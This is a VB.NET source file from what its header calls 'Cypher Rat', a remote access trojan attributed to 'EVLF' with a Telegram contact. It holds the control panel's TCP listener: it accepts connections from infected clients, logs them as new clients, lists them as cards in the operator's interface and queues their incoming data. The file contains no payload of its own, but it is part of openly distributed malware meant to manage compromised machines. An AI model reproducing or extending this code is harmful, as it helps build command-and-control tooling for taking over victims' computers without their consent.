Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Threading
'------------------------------------
'---------Cypher Rat By EVLF
'-----------------------------------
'---------t.me/evlfdev
'------------------------------------
Namespace sockets
    Public Class Accept
        Public closing As Boolean = True
        Public ListTcpListener As List(Of Net.Sockets.TcpListener) = Nothing
        Public WithEvents Bgworker0 As ComponentModel.BackgroundWorker
        Public WithEvents Bgworker1 As ComponentModel.BackgroundWorker
        Public Listener As TcpListener
        Public ClientsOnline As Collection = New Collection
        Public RequestsReceiver As List(Of ListData) = New List(Of ListData)
        Public BytesSent, BytesReceived As Long
        Public SocketHandler As New ManualResetEvent(False)
        Public Sub New(ByVal ParametersString As String())
            Me.ClientsOnline = New Collection
            Me.RequestsReceiver = New List(Of ListData)
            Dim P As String = String.Empty
            For Each i In ParametersString
                Dim PORT As Integer = CInt(If(IsNumeric(i), i, -1))
                If PORT = -1 Then
                    MsgBox(String.Format("Entering characters is not allowed ---> {0}", i), MsgBoxStyle.Critical, reso.nameRAT)
                Else
                    If CheckPort(PORT) Then
                        Me.Listener = New Net.Sockets.TcpListener(Net.IPAddress.Any, PORT)
                        Me.Listener.Server.SendTimeout = -1
                        Me.Listener.Server.ReceiveTimeout = -1
                        Me.Listener.Server.SendBufferSize = 99999
                        Me.Listener.Server.ReceiveBufferSize = 99999
                        Me.Listener.Start()

                        Dim Scaner2 As New Thread(AddressOf Me.ScanerAsync)
                        Scaner2.Start()


                        Dim DataHandl As New Thread(AddressOf Me.DataHandlerAsync)
                        DataHandl.Start()

                        P &= PORT
                        closing = False
                    Else
                        MsgBox(String.Format("The specified port ({0}) is already in use", i), MsgBoxStyle.Critical, reso.nameRAT)
                        Environment.Exit(0)
                    End If
                End If
            Next
            infoServer.PORTS = P
        End Sub
        Public Sub ScanerAsync()
            While Data.angelform.Alive
                Try
                    Thread.Sleep(1)
                    SocketHandler.Reset()
                    Me.Listener.BeginAcceptTcpClient(New AsyncCallback(AddressOf Me.Accept), Me.Listener)
                    SocketHandler.WaitOne()
                Catch e As SocketException
                Catch ex As Exception
                End Try
            End While
        End Sub
        Private Sub Accept(ar As IAsyncResult)
            SocketHandler.Set()
            Try
                Me.Listener = CType(ar.AsyncState, TcpListener)
                Dim client As TcpClient = Me.Listener.EndAcceptTcpClient(ar)
                Dim SocketClient As New sockets.Client(client, CType(Me.Listener.LocalEndpoint, Net.IPEndPoint).Port, Me)
                Data.LOGIT(SocketClient, "New Client")
                SyncLock Me.ClientsOnline
                    If Me.ClientsOnline.Contains(SocketClient.ClientRemoteAddress) = False Then
                        Me.ClientsOnline.Add(New Object() {SocketClient, SocketClient.myClient}, SocketClient.ClientRemoteAddress, Nothing, Nothing)
                    End If
                End SyncLock

            Catch e As System.ObjectDisposedException
            Catch ex As Exception
            End Try

        End Sub
        Private Sub DataHandlerAsync()
            While Data.angelform.Alive
                Threading.Thread.Sleep(1)
                Try

                    SyncLock Me.RequestsReceiver
                        Dim i As ListData = Nothing
                        If Me.RequestsReceiver.Count > 0 Then
                            i = Me.RequestsReceiver(0)
                            Me.RequestsReceiver.RemoveAt(0)
                        End If
                        If Not i Is Nothing Then
                            Data.Data_0Async(New Object() {i.ClassClient, i.bByte, i.SizeData, i.TcpClient})
                            i.wait = True
                        End If
                    End SyncLock



                Catch ex As Exception
                End Try
            End While
        End Sub
        Private Function CheckPort(ByVal Port As Integer) As Boolean
            Dim ipGlobalProperties As IPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties()
            Dim tcpConnInfoArray As Net.IPEndPoint() = ipGlobalProperties.GetActiveTcpListeners()
            For Each info As Net.IPEndPoint In tcpConnInfoArray
                If info.Port = Port Then
                    Return False
                End If
            Next
            Return True
        End Function
        Private Sub Worker_DoWork(ByVal sender As Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bgworker0.DoWork
        End Sub
        Public Sub RemoveRow(CLient As Client)
            SyncLock Data.SyncWorkerRemove
                SyncLock Data.ActiveClient
                    If Data.ActiveClient.Contains(CLient.ClientAddressIP) Then
                        Data.ActiveClient.Remove(CLient.ClientAddressIP)
                    End If
                End SyncLock
                For Each r As ClientCard In Data.angelform.clientsflow.Controls
                    If r.Tag = CLient.UUID Then
                        Data.angelform.RemoveCard(r)
                        Exit For
                    End If
                Next
            End SyncLock
        End Sub
    End Class
End Namespace
